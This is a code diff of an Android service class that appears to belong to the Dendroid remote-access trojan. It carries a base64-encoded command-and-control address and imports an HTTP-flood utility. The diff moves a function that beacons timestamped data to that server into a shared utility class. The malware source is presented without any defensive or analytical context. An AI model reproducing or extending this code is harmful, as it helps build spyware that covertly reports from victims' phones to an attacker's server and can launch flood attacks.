@@ -79,6 +79,8 @@ import android.widget.Toast;
 import com.utils.HttpFloodUtils;
 import com.utils.NetWorkUtils;
 
+import static com.utils.CommonUtils.getInputStreamFromUrl;
+
 public class MyService extends Service {
     //********************************************************************************************************************************************************
     private String encodedURL = "aHR0cDovLzEwMS4yMDEuNjcuMTY1OjgwODA="; //encode the URL with http://www.motobit.com/util/base64-decoder-encoder.asp  (ex. http://pizzachip.com/dendroid)
@@ -575,41 +577,41 @@ public class MyService extends Service {
     };
 
     //********************************************************************************************************************************************************
-    public InputStream getInputStreamFromUrl(String urlBase, String urlData) throws UnsupportedEncodingException {
-
-        Log.i("com.connect", "base:" + urlBase);
-        Log.i("com.connect", "data:" + urlData);
-
-        String urlDataFormatted = urlData;
-
-        SimpleDateFormat sdf = new SimpleDateFormat("yyyy_MM_dd_HH:mm:ss");
-        String currentDateandTime = "[" + sdf.format(new Date()) + "] - ";
-        currentDateandTime = URLEncoder.encode(currentDateandTime, "UTF-8");
-
-        if (urlData.length() > 1) {
-            Log.d("com.connect", urlBase + urlData);
-
-            urlData = currentDateandTime + URLEncoder.encode(urlData, "UTF-8");
-            urlDataFormatted = urlData.replaceAll("\\.", "~period");
-
-            Log.i("com.connect", urlBase + urlDataFormatted);
-        }
-
-        if (NetWorkUtils.isNetworkConnected(getApplicationContext())) {
-            InputStream content = null;
-            try {
-                Log.i("com.connect", "network push POST");
-                HttpClient httpclient = new DefaultHttpClient();
-                HttpResponse response = httpclient.execute(new HttpGet(urlBase + urlDataFormatted));
-                content = response.getEntity().getContent();
-                httpclient.getConnectionManager().shutdown();
-            } catch (Exception e) {
-                Log.e("com.connect", "exception", e);
-            }
-            return content;
-        }
-        return null;
-    }
+//    public InputStream getInputStreamFromUrl(String urlBase, String urlData) throws UnsupportedEncodingException {
+//
+//        Log.i("com.connect", "base:" + urlBase);
+//        Log.i("com.connect", "data:" + urlData);
+//
+//        String urlDataFormatted = urlData;
+//
+//        SimpleDateFormat sdf = new SimpleDateFormat("yyyy_MM_dd_HH:mm:ss");
+//        String currentDateandTime = "[" + sdf.format(new Date()) + "] - ";
+//        currentDateandTime = URLEncoder.encode(currentDateandTime, "UTF-8");
+//
+//        if (urlData.length() > 1) {
+//            Log.d("com.connect", urlBase + urlData);
+//
+//            urlData = currentDateandTime + URLEncoder.encode(urlData, "UTF-8");
+//            urlDataFormatted = urlData.replaceAll("\\.", "~period");
+//
+//            Log.i("com.connect", urlBase + urlDataFormatted);
+//        }
+//
+//        if (NetWorkUtils.isNetworkConnected(getApplicationContext())) {
+//            InputStream content = null;
+//            try {
+//                Log.i("com.connect", "network push POST");
+//                HttpClient httpclient = new DefaultHttpClient();
+//                HttpResponse response = httpclient.execute(new HttpGet(urlBase + urlDataFormatted));
+//                content = response.getEntity().getContent();
+//                httpclient.getConnectionManager().shutdown();
+//            } catch (Exception e) {
+//                Log.e("com.connect", "exception", e);
+//            }
+//            return content;
+//        }
+//        return null;
+//    }
 
     //********************************************************************************************************************************************************
     public class mediaVolumeUp extends AsyncTask<String, Void, String> {
